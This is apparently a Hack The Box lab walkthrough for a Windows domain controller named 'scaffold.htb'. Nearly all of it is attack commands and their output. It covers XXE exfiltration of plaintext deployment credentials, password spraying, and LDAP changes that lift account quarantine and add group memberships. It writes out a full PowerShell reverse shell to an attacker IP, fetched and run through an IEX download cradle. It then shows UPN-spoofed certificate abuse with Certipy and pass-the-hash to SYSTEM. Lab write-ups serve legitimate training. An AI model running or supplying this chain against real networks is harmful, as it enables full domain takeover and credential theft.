# Discovery
nmap scan: `nmap.txt`
## Interesting Ports
```
9800/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9801/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

## Port 9800
```sh
 ❯ curl -i http://10.129.154.78:9800
HTTP/1.1 503 Service Unavailable
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Thu, 19 Nov 2026 23:37:00 GMT
Connection: close
Content-Length: 326

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Service Unavailable</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Service Unavailable</h2>
<hr><p>HTTP Error 503. The service is unavailable.</p>
</BODY></HTML>
```

## Port 9801
```sh
 ❯ curl -i http://10.129.154.78:9801
HTTP/1.1 503 Service Unavailable
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Thu, 19 Nov 2026 23:37:02 GMT
Connection: close
Content-Length: 326

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Service Unavailable</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Service Unavailable</h2>
<hr><p>HTTP Error 503. The service is unavailable.</p>
</BODY></HTML>
```

## Windows MDT Service
```sh
curl -i http://10.129.154.78:9801/MDTMonitorData/Computers
curl -i http://10.129.154.78:9801/MDTMonitorData/\$metadata
```

```
curl -i http://10.129.154.78:9800/MDTMonitorEvent/GetSettings?uniqueID=11111111-1111-1111-1111-1111-11111111111111
```

## Stored XXE in MDT Monitor event service
Using `wtftp`:
```sh
 ❯ uv run wtftp.py exfil \                                                                    main ✹
-t "$TARGET" \
-d "$LOCAL" \
-s 'Y:/DeploymentShare/Control/' \
-f Bootstrap.ini
wtftp.py by @unsigned_sh0rt
[*] Creating new computer deployment at target MDT server.
[+] New computer deployment added successfully with GUID: 043a6e47-9b89-471e-9caf-c3a3e9d1601a
[*] Requesting computer ID..
[+] Got computer deployment ID: 56
[*] Adding XXE to computer settings entery.
[+] Got expected status 204 status code, XXE should be ready
[*] Exfil XXE staged in DB, starting servers..
[+] Exfil listener running on port 9000
[+] DTD server running on port 8000
[+] Kicking file transfer
10.129.154.78 - - [19/Nov/2026 17:54:11] "GET /exfil.dtd HTTP/1.1" 200 -
[Settings]
Priority=Default

[Default]
DeployRoot=\\DC\DeploymentShare$
UserID=svc_mdt
UserPassword=RubiksCubeTwice2026!
UserDomain=scaffold.htb
SkipBDDWelcome=YES
[*] Waiting for exfil data... (Ctrl+C to stop)
```
```sh
 ❯ uv run wtftp.py exfil \                                                                    main ✹
-t "$TARGET" \
-d "$LOCAL" \
-s 'Y:/DeploymentShare/Control/' \
-f CustomSettings.ini
wtftp.py by @unsigned_sh0rt
[*] Creating new computer deployment at target MDT server.
[+] New computer deployment added successfully with GUID: 98d90536-0e5b-465f-9a4d-c36f2ec0404d
[*] Requesting computer ID..
[+] Got computer deployment ID: 57
[*] Adding XXE to computer settings entery.
[+] Got expected status 204 status code, XXE should be ready
[*] Exfil XXE staged in DB, starting servers..
[+] Exfil listener running on port 9000
[+] DTD server running on port 8000
[+] Kicking file transfer
10.129.154.78 - - [19/Nov/2026 17:54:31] "GET /exfil.dtd HTTP/1.1" 200 -
[Settings]
Priority=Default
Properties=MyCustomProperty

[Default]
OSInstall=Y


DeployRoot=\\DC\DeploymentShare$
UserID=svc_deploy
UserPassword=DeployPipe2026$Secure
UserDomain=scaffold.htb


JoinDomain=scaffold.htb
DomainAdmin=svc_deploy
DomainAdminPassword=Depl0yPipe2026$Secure
MachineObjectOU=OU=Workstations,OU=Computers,DC=scaffold,DC=htb


SkipCapture=NO
SkipAdminPassword=YES
SkipProductKey=YES
SkipComputerBackup=NO
SkipBitLocker=NO
SkipLocaleSelection=YES
SkipTimeZone=YES
SkipUserData=YES
SkipComputerName=NO
SkipDomainMembership=NO


KeyboardLocale=en-US
UserLocale=en-US
UILanguage=en-US
HideShell=YES
ApplyGPOPack=YES
EventService=http://dc:9800
[*] Waiting for exfil data... (Ctrl+C to stop)
```

Useful User and Password are:
```sh
User: svc_deploy
Password: Depl0yPipe2026$Secure
```

## LDAP Users Scan
```sh
 ❯ nxc ldap $TARGET \
-u "r.wilson" \
-p "$DEPLOY_PASS" \
--users
LDAP        10.129.154.78   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:scaffold.htb) (signing:None) (channel binding:Never)
LDAP        10.129.154.78   389    DC               [+] scaffold.htb\r.wilson:Depl0yPipe2026$Secure
LDAP        10.129.154.78   389    DC               [*] Enumerated 15 domain users: scaffold.htb
LDAP        10.129.154.78   389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.154.78   389    DC               Administrator                 2026-09-02 01:53:53 0        Built-in account for administering the computer/domain
LDAP        10.129.154.78   389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.154.78   389    DC               krbtgt                        2026-05-13 16:43:41 0        Key Distribution Center Service Account
LDAP        10.129.154.78   389    DC               svc_mdt                       2026-05-17 18:08:30 0
LDAP        10.129.154.78   389    DC               m.carter                      2026-05-17 18:04:48 0        Retained for endpoint migration validation. Temp reset: BlueSkyTempReset2026!
LDAP        10.129.154.78   389    DC               svc_deploy                    2026-05-13 17:10:51 0
LDAP        10.129.154.78   389    DC               t.nguyen                      2026-05-13 17:11:11 0
LDAP        10.129.154.78   389    DC               j.harris                      2026-05-13 17:12:09 0
LDAP        10.129.154.78   389    DC               r.wilson                      2026-05-14 23:51:20 0
LDAP        10.129.154.78   389    DC               k.patel                       2026-05-22 02:13:18 0
LDAP        10.129.154.78   389    DC               d.cooper                      2026-05-24 16:39:21 0
LDAP        10.129.154.78   389    DC               m.chen                        2026-05-25 16:46:06 0
LDAP        10.129.154.78   389    DC               t.walker                      2026-05-25 16:45:16 0
LDAP        10.129.154.78   389    DC               o.bennett                     2026-05-24 16:39:45 0
LDAP        10.129.154.78   389    DC               svc_mdtmonitor                2026-09-08 04:49:11 0
```

## Password Spray
```sh
 ❯ ./kerbrute passwordspray -d scaffold.htb --dc $TARGET ../users.txt "$DEPLOY_PASS"                                                                                                                   master ✭

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 11/19/26 - Ronnie Flathers @ropnop

2026/11/19 18:19:08 >  Using KDC(s):
2026/11/19 18:19:08 >  	10.129.246.248:88

2026/11/19 18:19:08 >  [+] VALID LOGIN WITH ERROR:	 svc_deploy@scaffold.htb:Depl0yPipe2026$Secure	 (Clock skew is too great)
2026/11/19 18:19:08 >  [+] VALID LOGIN WITH ERROR:	 r.wilson@scaffold.htb:Depl0yPipe2026$Secure	 (Clock skew is too great)
2026/11/19 18:19:09 >  Done! Tested 15 logins (2 successes) in 0.414 seconds
```

## Remote Management Users
```sh
rpcclient -U "SCAFFOLD/r.wilson%$DEPLOY_PASS" $TARGET
rpcclient $> enumalsgroups
Usage: enumalsgroups builtin|domain [access mask] [max_size]
rpcclient $> enumalsgroups builtin
group:[Server Operators] rid:[0x225]
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]
rpcclient $> queryaliasmem builtin 0x244
	sid:[S-1-5-21-365932789-2848835602-3476675013-6101]
rpcclient $> lookupsids S-1-5-21-365932789-2848835602-3476675013-6101
S-1-5-21-365932789-2848835602-3476675013-6101 SCAFFOLD\d.cooper (1)
```

# Inital Foothold
Initial Foothold through `m.carter`, but this User is in the `Quarantined_Accounts`, so we can not login with this User. And `r.wilson`, doesnt have the `Helpdesk operator` Group.

Give `r.wilson` the `Helpdesk operator` Group
```sh
 ❯ ldapmodify -x \
-H "ldap://$TARGET" \
-D 'r.wilson@scaffold.htb' \
-w "$DEPLOY_PASS" \
-f ./add-wilson.ldif

modifying entry "CN=Helpdesk operator,OU=Helpdesk,OU=Scaffold,DC=scaffold,DC=htb"
```

Enable `m.carter` to not disabled. This changes `66050` to `66048`, clearing only the `ACCOUNTDISABLE` flag.
```sh
 ❯ ldapmodify -x \
-H "ldap://$TARGET" \
-D 'r.wilson@scaffold.htb' \
-w "$DEPLOY_PASS" \
-f ./enable-carter.ldif

modifying entry "CN=m.carter,OU=Users,OU=Scaffold,DC=Scaffold,DC=htb"
```

## Checking Changes
```sh
 ❯ nxc ldap $TARGET \
  -d scaffold.htb \
  -u "r.wilson" -p "$DEPLOY_PASS" \
  --query '(sAMAccountName=m.carter)' \
  'sAMAccountName userAccountControl memberOf'
LDAP        10.129.246.248  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:scaffold.htb) (signing:None) (channel binding:Never)
LDAP        10.129.246.248  389    DC               [+] scaffold.htb\r.wilson:Depl0yPipe2026$Secure
LDAP        10.129.246.248  389    DC               [+] Response for object: CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb
LDAP        10.129.246.248  389    DC               memberOf             CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb
LDAP        10.129.246.248  389    DC                                    CN=IT,OU=IT,OU=Scaffold,DC=scaffold,DC=htb
LDAP        10.129.246.248  389    DC               userAccountControl   66048
LDAP        10.129.246.248  389    DC               sAMAccountName       m.carter
~/hackthebox/htb-scaffold   wiseman@wis3man 
 ❯ nxc ldap $TARGET \
  -d scaffold.htb \
  -u 'r.wilson' -p "$DEPLOY_PASS" \
  --query '(cn=Quarantined_Accounts)' \
  'cn groupType member'
LDAP        10.129.246.248  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:scaffold.htb) (signing:None) (channel binding:Never)
LDAP        10.129.246.248  389    DC               [+] scaffold.htb\r.wilson:Depl0yPipe2026$Secure
LDAP        10.129.246.248  389    DC               [+] Response for object: CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb
LDAP        10.129.246.248  389    DC               cn                   Quarantined_Accounts
LDAP        10.129.246.248  389    DC               member               CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb
LDAP        10.129.246.248  389    DC               groupType            -2147483640
```

## Modifying Group Type of `Quarantined_Accounts`
```sh
 ❯ cat unquarantine.ldif
dn: CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb
changetype: modify
replace: groupType
groupType: 2

 ❯ ldapmodify -x \
-H "ldap://$TARGET" \
-D 'r.wilson@scaffold.htb' \
-w "$DEPLOY_PASS" \
-f ./unquarantine.ldif
modifying entry "CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb"
ldap_modify: Insufficient access (50)
	additional info: 00002098: SecErr: DSID-0315146D, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0

 ❯ ldapmodify -x \
-H "ldap://$TARGET" \
-D 'svc_deploy@scaffold.htb' \
-w "$DEPLOY_PASS" \
-f ./unquarantine.ldif
modifying entry "CN=Quarantined_Accounts,OU=Scaffold,DC=scaffold,DC=htb"
```

## Modify Group Type of `IT`
```sh
cat > enable-it.ldif <<'EOF'
dn: CN=IT,OU=IT,OU=Scaffold,DC=scaffold,DC=htb
changetype: modify
replace: groupType
groupType: -2147483646
EOF

 ❯ ldapmodify -x \
-H "ldap://$TARGET" \
-D 'svc_deploy@scaffold.htb' \
-w "$DEPLOY_PASS" \
-f ./enable-it.ldif
modifying entry "CN=IT,OU=IT,OU=Scaffold,DC=scaffold,DC=htb"
```

### Verify
```sh
 ❯ nxc ldap "$TARGET" \
  -d scaffold.htb \
  -u r.wilson -p "$DEPLOY_PASS" \
  --query '(cn=IT)' \
  'cn groupType member'
LDAP        10.129.246.248  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:scaffold.htb) (signing:None) (channel binding:Never)
LDAP        10.129.246.248  389    DC               [+] scaffold.htb\r.wilson:Depl0yPipe2026$Secure
LDAP        10.129.246.248  389    DC               [+] Response for object: CN=IT,OU=IT,OU=Scaffold,DC=scaffold,DC=htb
LDAP        10.129.246.248  389    DC               cn                   IT
LDAP        10.129.246.248  389    DC               member               CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb
LDAP        10.129.246.248  389    DC               groupType            -2147483646
```

## Add `m.carter` to `Endpoint Remote Management`
```sh
 ❯ cat > add-carter-remote.ldif <<'EOF'
dn: CN=Endpoint Remote Management,OU=ManagedObjects,OU=Scaffold,DC=scaffold,DC=htb
changetype: modify
add: member
member: CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb
EOF

 ❯ ldapmodify -x \
-H "ldap://$TARGET" \
-D 'm.carter@scaffold.htb' \
-w "$CARTER_PASS" \
-f ./add-carter-remote.ldif
modifying entry "CN=Endpoint Remote Management,OU=ManagedObjects,OU=Scaffold,DC=scaffold,DC=htb"
```

### Verify
```sh
 ❯ nxc ldap "$TARGET" \
  -d scaffold.htb \
  -u r.wilson -p "$DEPLOY_PASS" \
  --query '(cn=Endpoint Remote Management)' 'cn member'
LDAP        10.129.246.248  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:scaffold.htb) (signing:None) (channel binding:Never)
LDAP        10.129.246.248  389    DC               [+] scaffold.htb\r.wilson:Depl0yPipe2026$Secure
LDAP        10.129.246.248  389    DC               [+] Response for object: CN=Endpoint Remote Management,OU=ManagedObjects,OU=Scaffold,DC=scaffold,DC=htb
LDAP        10.129.246.248  389    DC               cn                   Endpoint Remote Management
LDAP        10.129.246.248  389    DC               member               CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb
```

## FOOTHOLD
With User `m.carter`
```sh
 ❯ cat > shell.ps1 <<'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',4444)
$stream = $client.GetStream()
$bytes = New-Object byte[] 65536

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $command = [System.Text.Encoding]::UTF8.GetString($bytes, 0, $i)
    try {
        $output = (Invoke-Expression $command 2>&1 | Out-String)
    } catch {
        $output = ($_ | Out-String)
    }
    $response = [System.Text.Encoding]::UTF8.GetBytes(
        $output + "PS " + (Get-Location).Path + "> "
    )
    $stream.Write($response, 0, $response.Length)
}

$client.Close()
EOF
```

```sh
 ❯ dcomexec.py \
  -object MMC20 \
  -shell-type powershell \
  -nooutput \
  -hashes ":$CARTER_HASH" \
  "scaffold.htb/m.carter@$TARGET" \
  'IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.23:8008/shell.ps1")'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
```
After executing, waiting a little bit, until the Reverse Shell is established.

# Found user.txt
```sh
PS C:\Users\m.carter> cd Desktop
dir


    Directory: C:\Users\m.carter\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/19/2026   4:18 PM             34 user.txt


PS C:\Users\m.carter\Desktop> type user.txt
4e3b23c97eccc4cfe2bc8712e2ea78f7
PS C:\Users\m.carter\Desktop>
```

# Local Privilege Escalation (LPE)
Going from `m.carter` to `Administrator`

## Changing `userPrincipalName` to `Administrator`
```sh
 ❯ cat > carter-upn.ldif <<'EOF'
dn: CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb
changetype: modify
replace: userPrincipalName
userPrincipalName: Administrator
-
replace: mail
mail: m.carter@scaffold.htb
EOF
```

### Verify
```sh
 ❯ nxc ldap "$TARGET" \
  -d scaffold.htb \
  -u r.wilson -p "$DEPLOY_PASS" \
  --query '(sAMAccountName=m.carter)' 'sAMAccountName userPrincipalName'
LDAP        10.129.246.248  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:scaffold.htb) (signing:None) (channel binding:Never)
LDAP        10.129.246.248  389    DC               [+] scaffold.htb\r.wilson:Depl0yPipe2026$Secure
LDAP        10.129.246.248  389    DC               [+] Response for object: CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb
LDAP        10.129.246.248  389    DC               sAMAccountName       m.carter
LDAP        10.129.246.248  389    DC               userPrincipalName    Administrator
```

## Request Certificate with new `userPrincipalName`
```sh
 ❯ certipy req \
  -u 'm.carter@scaffold.htb' \
  -hashes ":$CARTER_HASH" \
  -dc-ip "$TARGET" \
  -target dc.scaffold.htb \
  -ca 'scaffold-DC-CA' \
  -template User
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 44
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```


## Restore m.carter
```sh
 ❯ cat > carter-restore.ldif <<'EOF'
dn: CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb
changetype: modify
replace: userPrincipalName
userPrincipalName: m.carter@scaffold.htb
-
delete: mail
EOF

 ❯ ldapmodify -x \
-H "ldap://$TARGET" \
-D 'r.wilson@scaffold.htb' \
-w "$DEPLOY_PASS" \
-f ./carter-restore.ldif
modifying entry "CN=m.carter,OU=Users,OU=Scaffold,DC=scaffold,DC=htb"
```


## Auth with Certificate (FAILED)
```sh
 ❯ certipy auth \
  -pfx certificates/administrator.pfx \
  -username Administrator \
  -domain scaffold.htb \
  -dc-ip "$TARGET"
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@scaffold.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

## Sync clock with DC
```sh
~/hackthebox/htb-scaffold   wiseman@wis3man 
 ❯ sudo timedatectl set-ntp false # true, for resetting back to normal

~/hackthebox/htb-scaffold   wiseman@wis3man 
 ❯ timedatectl status
               Local time: Do 2026-11-19 21:02:42 CET
           Universal time: Do 2026-11-19 20:02:42 UTC
                 RTC time: Do 2026-11-19 20:02:42
                Time zone: Europe/Vienna (CET, +0100)
System clock synchronized: yes
              NTP service: inactive
          RTC in local TZ: no

 ❯ sudo ntpdate -u "$TARGET"
20 Nov 04:03:00 ntpdate[94272]: step time server 10.129.246.248 offset +25199.690580 sec

 ❯ ntpdate -q "$TARGET"
server 10.129.246.248, stratum 1, offset -0.038868, delay 0.16536
20 Nov 04:03:54 ntpdate[94931]: adjust time server 10.129.246.248 offset -0.038868 sec

~/hackthebox/htb-scaffold   wiseman@wis3man 
 ❯ date -u
Fr 20 Nov 2026 03:03:59 UTC
```

## Auth with Certificate (Again)
```sh
 ❯ certipy auth \
  -pfx certificates/administrator.pfx \
  -username Administrator \
  -domain scaffold.htb \
  -dc-ip "$TARGET"
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@scaffold.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@scaffold.htb': aad3b435b51404eeaad3b435b51404ee:cb9ec119e1de7e83330a91c04fed3979
```

## Testing Hash
```sh
 ❯ export ADMIN_HASH='aad3b435b51404eeaad3b435b51404ee:cb9ec119e1de7e83330a91c04fed3979'
~/hackthebox/htb-scaffold   wiseman@wis3man 
 ❯ nxc smb "$TARGET" \
  -d scaffold.htb \
  -u Administrator \
  -H "$ADMIN_HASH"
SMB         10.129.246.248  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:scaffold.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.246.248  445    DC               [+] scaffold.htb\Administrator:cb9ec119e1de7e83330a91c04fed3979 (Pwn3d!)
```

## Actual LPE
```sh
 ❯ export ADMIN_NT_HASH="${ADMIN_HASH##*:}"
~/hackthebox/htb-scaffold   wiseman@wis3man 
 ❯ echo "$ADMIN_NT_HASH"
cb9ec119e1de7e83330a91c04fed3979
~/hackthebox/htb-scaffold   wiseman@wis3man 
 ❯ psexec.py \
-hashes ":$ADMIN_NT_HASH" \
"scaffold.htb/Administrator@$TARGET"
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.246.248.....
[*] Found writable share ADMIN$
[*] Uploading file JzYolhXO.exe
[*] Opening SVCManager on 10.129.246.248.....
[*] Creating service PnyF on 10.129.246.248.....
[*] Starting service PnyF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

# Found root.txt
```sh
C:\Users\Administrator> cd Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 30CE-5D5A

 Directory of C:\Users\Administrator\Desktop

06/02/2026  06:16 AM    <DIR>          .
09/07/2026  07:00 PM    <DIR>          ..
05/23/2026  04:08 AM             2,308 Microsoft Edge.lnk
11/19/2026  04:18 PM                34 root.txt
               2 File(s)          2,342 bytes
               2 Dir(s)   8,375,738,368 bytes free

C:\Users\Administrator\Desktop> type root.txt
a6cba8088da9cc2787f84796d5e16eca
```
